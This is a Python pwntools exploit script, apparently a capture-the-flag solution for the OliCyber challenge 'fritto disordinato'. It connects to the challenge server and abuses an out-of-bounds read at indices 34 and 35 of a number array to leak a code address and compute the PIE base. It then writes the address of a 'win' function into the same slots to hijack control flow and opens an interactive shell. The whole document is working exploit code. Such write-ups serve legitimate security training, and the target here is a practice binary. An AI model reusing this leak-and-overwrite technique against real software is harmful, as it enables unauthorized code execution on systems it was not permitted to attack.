from pwn import *

exe = ELF("./fritto_patched")

context.binary = exe

HOST = "fritto-disordinato.challs.olicyber.it"
PORT = 33001

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_pie(r):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"leggere?", b"34")

    r.recvuntil(b"numero: ")
    addr = int(r.recvline().decode())

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"leggere?", b"35")

    r.recvuntil(b"numero: ")
    exe.address = addr + (int(r.recvline().decode()) << 32) + 0xffff5f76 
    
    log.success(f"LEAKED PIE BASE: {hex(exe.address)}")
    
def write_win(r):
    addr = hex(exe.symbols.win)[2:].rjust(16, "0")

    low = addr[8:]
    high = addr[:8]

    r.sendlineafter(b"> ", b"0")
    r.sendlineafter(b"numero?", b"34")
    
    r.sendlineafter(b"scriverci?", str(int(low, 16)).encode())

    r.sendlineafter(b"> ", b"0")
    r.sendlineafter(b"numero?", b"35")
    
    r.sendlineafter(b"scriverci?", str(int(high, 16)).encode())
    
def main():
    r = conn()

    leak_pie(r)
    write_win(r)

    
    r.sendline(b"7")
    r.interactive()

if __name__ == "__main__":
    main()
